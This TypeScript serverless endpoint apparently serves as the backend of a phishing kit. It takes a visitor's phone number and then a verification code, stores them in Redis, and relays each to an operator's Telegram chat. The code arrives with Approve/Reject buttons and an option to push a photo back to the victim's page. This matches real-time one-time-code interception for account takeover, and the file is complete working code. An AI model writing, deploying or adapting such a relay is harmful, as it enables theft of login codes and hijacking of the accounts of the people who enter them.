import type { VercelRequest, VercelResponse } from '@vercel/node';

type Body = {
  type: 'phone' | 'verification';
  value: string;
  sessionId?: string;
};

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN as string;
const ADMIN_CHAT_ID = (process.env.ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID) as string;
const UPSTASH_URL = process.env.UPSTASH_REDIS_REST_URL as string;
const UPSTASH_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN as string;

async function kvGet(key: string) {
  const r = await fetch(`${UPSTASH_URL}/GET/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` },
  });
  const j = await r.json();
  return j.result ?? null;
}
async function kvSet(key: string, val: string, ttlSec?: number) {
  const ex = ttlSec ? `?EX=${ttlSec}` : '';
  const r = await fetch(`${UPSTASH_URL}/SET/${encodeURIComponent(key)}/${encodeURIComponent(val)}${ex}`, {
    headers: { Authorization: `Bearer ${UPSTASH_TOKEN}` },
  });
  const j = await r.json();
  return j.result === 'OK';
}

const TG_API = (token: string) => `https://api.telegram.org/bot${token}`;

async function sendMessage(text: string, replyMarkup?: any) {
  const payload: any = { chat_id: ADMIN_CHAT_ID, text };
  if (replyMarkup) payload.reply_markup = replyMarkup;
  const r = await fetch(`${TG_API(TG_TOKEN)}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  const j = await r.json();
  return j;
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    const body = (req.body || {}) as Body;
    const { type, value } = body;
    const sessionId = (body.sessionId || req.query.sessionId) as string | undefined;

    if (!TG_TOKEN || !ADMIN_CHAT_ID || !UPSTASH_URL || !UPSTASH_TOKEN) {
      res.status(500).json({ error: 'Server not configured' });
      return;
    }
    if (!type || !value) {
      res.status(400).json({ error: 'Missing type or value' });
      return;
    }
    if (!sessionId) {
      res.status(400).json({ error: 'Missing sessionId' });
      return;
    }

    if (type === 'phone') {
      await kvSet(`phone:${sessionId}`, value, 3600);
      // optional: notify admin
      await sendMessage(`Phone submitted: ${value}\nSession: ${sessionId}`);
      res.status(200).json({ ok: true });
      return;
    }

    if (type === 'verification') {
      await kvSet(`code:${sessionId}`, value, 3600);
      await kvSet(`status:${sessionId}`, 'pending', 3600);

      const phone = await kvGet(`phone:${sessionId}`);
      const msg = `Verify code: ${value}\nFor phone: ${phone ?? 'UNKNOWN'}\nSession: ${sessionId}\n\n(Reply to this message with a photo to show it to the user)`;
      const inline = {
        inline_keyboard: [[
          { text: 'Approve ✅', callback_data: `approve|${sessionId}` },
          { text: 'Reject ❌',  callback_data: `reject|${sessionId}` },
        ]],
      };
      const j = await sendMessage(msg, inline);
      const mid = j?.result?.message_id;
      if (mid) {
        await kvSet(`msg_session:${mid}`, sessionId, 3600);
      }
      res.status(200).json({ ok: true });
      return;
    }

    res.status(400).json({ error: 'Invalid type' });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'Internal error' });
  }
}